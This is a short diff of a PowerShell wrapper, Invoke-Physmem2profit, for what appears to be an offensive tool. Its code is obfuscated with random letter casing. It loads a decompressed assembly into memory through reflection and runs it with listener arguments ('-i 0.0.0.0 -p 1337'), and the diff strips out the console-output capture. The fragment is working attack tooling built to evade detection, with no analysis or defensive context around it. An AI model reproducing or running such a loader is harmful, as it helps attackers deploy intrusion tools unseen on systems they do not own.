@@ -9,14 +9,6 @@ function Invoke-Physmem2profit
     $dEcoMPReSSEd.copYto( $outPUt )
     [BYte[]]$ByTEOuTarrAy = $OUtPUT.toarrAY()
     $RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load($bYTeOUTArraY)
-    $olDconsOLeOuT = [CONSoLe]::out
-    $StRInGwritEr = nEW-ObJEct System.IO.STRiNgwRiTEr
-    [cONSOLE]::sEtOut($STringWRITer)
-
     [Physmem2profit.Program]::maiN($CoMmAND.Split())
-
-    [cOnsolE]::sEtout($olDCONsOleout)
-    $resUlTs = $sTRInGWRiter.TOSTring()
-    $rESuLTs
 }
 Invoke-Physmem2profit -C "-i 0.0.0.0 -p 1337 -h"
